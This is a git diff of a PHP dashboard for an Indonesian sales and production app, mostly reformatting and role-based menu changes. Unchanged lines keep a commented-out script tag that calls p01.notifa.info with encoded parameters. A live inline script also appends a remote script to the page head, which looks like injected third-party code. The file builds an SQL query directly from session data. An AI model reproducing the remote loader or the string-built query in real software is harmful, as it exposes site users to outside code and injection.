@@ -1,7 +1,7 @@
 <?php
-include 'proses/koneksi.php'; 
-include 'proses/function.php'; 
-if(empty($_SESSION['username'])){
+include 'proses/koneksi.php';
+include 'proses/function.php';
+if (empty($_SESSION['username'])) {
 	header("Location:login-page.php");
 }
 
@@ -33,26 +33,26 @@ if(empty($_SESSION['username'])){
 	<!-- /global stylesheets -->
 
 	<!-- Core JS files -->
-	
+
 	<script type="text/javascript" src="assets/js/plugins/loaders/pace.min.js"></script>
 	<script type="text/javascript" src="assets/js/core/libraries/jquery.min.js"></script>
 	<script type="text/javascript" src="assets/js/core/libraries/bootstrap.min.js"></script>
 	<script type="text/javascript" src="assets/js/plugins/loaders/blockui.min.js"></script>
 	<!-- /core JS files -->
 	<script type="text/javascript" src="assets/js/core/libraries/jasny_bootstrap.min.js"></script>
-	
+
 	<script type="text/javascript" src="assets/js/plugins/tables/datatables/datatables.min.js"></script>
-	
+
 	<script type="text/javascript" src="assets/js/plugins/tables/datatables/extensions/pdfmake/pdfmake.min.js"></script>
 	<script type="text/javascript" src="assets/js/plugins/tables/datatables/extensions/pdfmake/vfs_fonts.min.js"></script>
 	<script type="text/javascript" src="assets/js/plugins/tables/datatables/extensions/buttons.min.js"></script>
-	
+
 
 
 	<script type="text/javascript" src="assets/js/pages/form_input_groups.js"></script>
-	
 
-	
+
+
 	<script type="text/javascript" src="assets/js/plugins/uploaders/fileinput/fileinput.min.js"></script>
 	<script type="text/javascript" src="assets/js/pages/uploader_bootstrap.js"></script>
 	<script type="text/javascript" src="assets/js/core/libraries/jquery_ui/widgets.min.js"></script>
@@ -65,7 +65,7 @@ if(empty($_SESSION['username'])){
 	<script type="text/javascript" src="assets/js/pages/form_inputs.js"></script>
 
 	<!-- Theme JS files -->
-	
+
 	<script type="text/javascript" src="assets/js/plugins/visualization/d3/d3.min.js"></script>
 	<script type="text/javascript" src="assets/js/plugins/visualization/c3/c3.min.js"></script>
 	<script type="text/javascript" src="assets/js/plugins/visualization/d3/d3_tooltip.js"></script>
@@ -77,8 +77,8 @@ if(empty($_SESSION['username'])){
 
 	<!-- Theme JS files -->
 
-	
-	
+
+
 	<script type="text/javascript" src="assets/js/plugins/forms/inputs/touchspin.min.js"></script>
 
 	<!-- Theme JS files -->
@@ -89,15 +89,15 @@ if(empty($_SESSION['username'])){
 	<script type="text/javascript" src="assets/js/plugins/buttons/ladda.min.js"></script>
 
 	<script type="text/javascript" src="assets/js/core/app.js"></script>
-	
-	
+
+
 	<script type="text/javascript" src="assets/js/pages/ecommerce_orders_history.js"></script>
 	<script type="text/javascript" src="assets/js/pages/components_buttons.js"></script>
 	<script type="text/javascript" src="assets/js/pages/dashboard.js"></script>
-	
-	
-	
-	
+
+
+
+
 
 
 	<script type="text/javascript" src="assets/js/plugins/ui/ripple.min.js"></script>
@@ -106,6 +106,7 @@ if(empty($_SESSION['username'])){
 	<!-- <script type="text/javascript" async="" src="http://p01.notifa.info/3fsmd3/request?id=1&amp;enc=9UwkxLgY9&amp;params=4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mVPOusGZYLpfqT6nfh03G6uiMlelqeNgEqHjBJuZk8rLOubZXl62Qv6WVJN8lJFcyaPpUV7Tux1oQpB49HrPzqrbwmfy74C8Z5ZzO17ZdkwJqKHjmuY67QlnQVSGgAKFgk8MMrFnR0tmuwR99i9Z9leHD%2bHA9sQcFu5ldJWa3QAdgielop6h6EwgsDQV6p0ieBpjtJ%2fJ5lpuPU%2beD0%2fLbobXvW0MhsudRIzaxrYMno1fCihodfv%2bA6mBClyMDA8i3weP3Ys3%2fwDh8OqvqXYhwCqPPH2zggDpNpvRUa4r26up%2fWRJtW9gcGq8X3Kbhi4vPGUg%2fxkqwEJOorqgkbohJFy94u15LtfYfHasVn%2fNoOLT0q9teNCtdRYThsno2HG3xDS24oj%2bXc8gpLvVeqoAh5eiIx0fOR%2bfzck55jmVvTr%2fZyiMgAFoORGnQIlNvuNvdmz4GHMxeJ0IxMOrI7NtC7lYExrDaym3TOkbq5tXfJ3jHUlBX8Zp1gf5v2J%2f5k8%2fconIoz0i4YAnoP43dPAYvvVJiFz%2bS4thE&amp;idc_r=23096064249&amp;domain=localhost&amp;sw=1366&amp;sh=768"></script> -->
 </head>
 <?php include "page/notif.php"; ?>
+
 <body class="pace-done">
 	<div class="pace  pace-inactive">
 		<div class="pace-progress" data-progress-text="100%" data-progress="99" style="transform: translate3d(100%, 0px, 0px);">
@@ -118,7 +119,7 @@ if(empty($_SESSION['username'])){
 	<div class="navbar navbar-default header-highlight">
 		<div class="navbar-header">
 			<a class="navbar-brand" href="index.php">
-				<img src="assets/images/logo.png"  alt="" style="height: 25px;margin-top: 0;">
+				<img src="assets/images/logo.png" alt="" style="height: 25px;margin-top: 0;">
 			</a>
 
 			<ul class="nav navbar-nav visible-xs-block">
@@ -158,7 +159,7 @@ if(empty($_SESSION['username'])){
 						</a>
 					</li>
 
-					
+
 				</ul>
 			</div>
 
@@ -179,9 +180,9 @@ if(empty($_SESSION['username'])){
 						<div class="category-content">
 							<div class="sidebar-user-material-content">
 								<a href="#" class="legitRipple">
-								<?php $sql=mysqli_query($conn,"SELECT * FROM user where username='$_SESSION[username]'");
-										$row= mysqli_fetch_array($sql);
-										?>
+									<?php $sql = mysqli_query($conn, "SELECT * FROM user where username='$_SESSION[username]'");
+									$row = mysqli_fetch_array($sql);
+									?>
 									<img src="img/user/<?php echo $row['img']; ?>" class="img-circle img-responsive" alt="">
 								</a>
 								<h6><?php echo $_SESSION['nama']; ?></h6>
@@ -207,102 +208,98 @@ if(empty($_SESSION['username'])){
 									</a>
 
 								</li>
-								<?php if($_SESSION['status']!='manager'){?>
-								<li class="">
-									<a href="#" class="has-ul legitRipple">
-										<i class="icon-grid"></i>
-										<span>Produk</span>
-									</a>
-									<ul class="hidden-ul" style="display: none;">
-										<li>
-											<a href="?p=dataproduk" class="legitRipple">Data Produk</a>
-										</li>
-										<?php if($_SESSION['status']!='mandor'){ ?>
-										<li>
-											<a href="?p=addproduk" class="legitRipple">Tambah Produk</a>
-										</li>
-										<?php } ?>
+								<?php if ($_SESSION['status'] != 'manager') { ?>
+									<li class="">
+										<a href="#" class="has-ul legitRipple">
+											<i class="icon-grid"></i>
+											<span>Produk</span>
+										</a>
+										<ul class="hidden-ul" style="display: none;">
+											<li>
+												<a href="?p=dataproduk" class="legitRipple">Data Produk</a>
+											</li>
+											<?php if ($_SESSION['status'] != 'mandor') { ?>
+												<li>
+													<a href="?p=addproduk" class="legitRipple">Tambah Produk</a>
+												</li>
+											<?php } ?>
 
-									</ul>
-								</li>
-								
-								<li class="">
-									<a href="?p=databahan" class="legitRipple">
-										<i class="icon-cube4"></i>
-										<span>Bahan Produksi</span>
-									</a>
+										</ul>
+									</li>
 
-								</li>
-								<?php if($_SESSION['status']=='admin'){?>
-								<li class="">
-									<a href="" class="has-ul legitRipple">
-										<i class="icon-copy"></i>
-										<span>Pre Order</span>
+									<!-- <li class="">
+												<a href="?p=databahan" class="legitRipple">
+													<i class="icon-cube4"></i>
+													<span>Bahan Produksi</span>
+												</a>
 
-									</a>
-									<ul class="hidden-ul" style="display: none;">
-										<li>
-											<a href="?p=preorder" class="legitRipple">Data Pre Order</a>
-										</li>
-										<li>
-											<a href="?p=addpreorder" class="legitRipple">Tambah Pre Order</a>
-										</li>
-									</ul>
-								</li>
-								<li class="">
-									<a href="" class="has-ul legitRipple">
-										<i class="icon-graph"></i>
-										<span>Penjualan</span>
+											</li>
+											<?php if ($_SESSION['status'] == 'admin') { ?>
+														<li class="">
+															<a href="" class="has-ul legitRipple">
+																<i class="icon-copy"></i>
+																<span>Pre Order</span>
 
-									</a>
-									<ul class="hidden-ul" style="display: none;">
-										<li>
-											<a href="?p=datapenjualan" class="legitRipple">Data Penjualan</a>
-										</li>
-										<li>
-											<a href="?p=adddatapenjualan" class="legitRipple">Tambah Data Penjualan</a>
-										</li>
-										
-									</ul>
-								</li>
-								
-								
-								
-								
-								
-								<li class="">
-									<a href="?p=karyawan" class="legitRipple">
-										<i class="icon-users4"></i>
-										<span>Karyawan</span>
-									</a>
+															</a>
+															<ul class="hidden-ul" style="display: none;">
+																<li>
+																	<a href="?p=preorder" class="legitRipple">Data Pre Order</a>
+																</li>
+																<li>
+																	<a href="?p=addpreorder" class="legitRipple">Tambah Pre Order</a>
+																</li>
+															</ul>
+														</li> -->
+										<li class="">
+											<a href="" class="has-ul legitRipple">
+												<i class="icon-graph"></i>
+												<span>Penjualan</span>
 
-								</li>
+											</a>
+											<ul class="hidden-ul" style="display: none;">
+												<li>
+													<a href="?p=datapenjualan" class="legitRipple">Data Penjualan</a>
+												</li>
+												<li>
+													<a href="?p=adddatapenjualan" class="legitRipple">Tambah Data Penjualan</a>
+												</li>
+
+											</ul>
+										</li>
+
+										<li class="">
+											<a href="?p=akun" class="legitRipple">
+												<i class="icon-users4"></i>
+												<span>Manajemen Akun</span>
+											</a>
+
+										</li>
+									<?php } ?>
+									<?php if ($_SESSION['status'] == 'mandor') { ?>
+										<li class="">
+											<a href="?p=preorder" class="legitRipple">
+												<i class="icon-copy"></i>
+												<span>Data Pre Order</span>
+											</a>
+
+										</li>
+									<?php } ?>
 								<?php } ?>
-								<?php if($_SESSION['status']=='mandor'){?>
-								<li class="">
-									<a href="?p=preorder" class="legitRipple">
-										<i class="icon-copy"></i>
-										<span>Data Pre Order</span>
-									</a>
+								<?php if ($_SESSION['status'] == 'manager') { ?>
+									<li class="">
 
-								</li>
-								<?php } ?>
-								<?php } ?>
-								<?php if($_SESSION['status']=='manager'){?>
-								<li class="">
-								
 										<a href="?p=reportpenjualan" class="legitRipple"><i class="icon-graph"></i>Report Penjualan</a>
-									
-								</li>
-								
-								<li class="">
-									<a href="?p=akun" class="legitRipple">
-										<i class="icon-user"></i>
-										<span>Manajemen Akun</span>
-									</a>
-								</li>
-								
-								
+
+									</li>
+
+									<li class="">
+										<a href="?p=akun" class="legitRipple">
+											<i class="icon-user"></i>
+											<span>Manajemen Akun</span>
+										</a>
+									</li>
+
+
 								<?php } ?>
 								<li class="">
 									<a href="proses/logout.php" class="legitRipple">
@@ -323,16 +320,16 @@ if(empty($_SESSION['username'])){
 				<div class="content">
 					<?php
 					$pages_dir = 'page';
-					if(!empty($_GET['p'])){
+					if (!empty($_GET['p'])) {
 						$pages = scandir($pages_dir, 0);
 						unset($pages[0], $pages[1]);
 						$p = $_GET['p'];
-						if(in_array($p.'.php', $pages))
-							include($pages_dir.'/'.$p.'.php');
+						if (in_array($p . '.php', $pages))
+							include($pages_dir . '/' . $p . '.php');
 						else
 							echo 'Halaman tidak ditemukan! :(';
 					} else
-						include($pages_dir.'/home.php');
+						include($pages_dir . '/home.php');
 					?>
 					<!-- Main charts -->
 					<!-- /main charts -->
@@ -361,7 +358,7 @@ if(empty($_SESSION['username'])){
 	<script type="text/javascript">
 		if (self == top) {
 			function netbro_cache_analytics(fn, callback) {
-				setTimeout(function () {
+				setTimeout(function() {
 					fn();
 					callback();
 				}, 0);
@@ -383,7 +380,7 @@ if(empty($_SESSION['username'])){
 				bsa.src = url;
 				(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
 			}
-			netbro_cache_analytics(requestCfs, function () {});
+			netbro_cache_analytics(requestCfs, function() {});
 		};
 	</script>
 
